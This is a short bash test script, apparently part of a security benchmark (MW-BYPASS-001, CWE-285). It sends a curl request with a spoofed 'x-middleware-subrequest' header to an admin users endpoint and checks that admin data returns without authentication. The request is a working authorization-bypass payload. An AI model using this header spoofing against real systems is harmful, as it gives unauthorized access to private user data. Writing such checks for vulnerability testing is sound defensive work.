#!/usr/bin/env bash
# MW-BYPASS-001 (CWE-285): spoofing x-middleware-subrequest reaches admin data
# with no authentication at all.
set -e; . "$(dirname "$0")/_lib.sh"
curl -s -H 'x-middleware-subrequest: 1' "$TARGET/api/admin/users" | grep -q 'admin@bench.local'
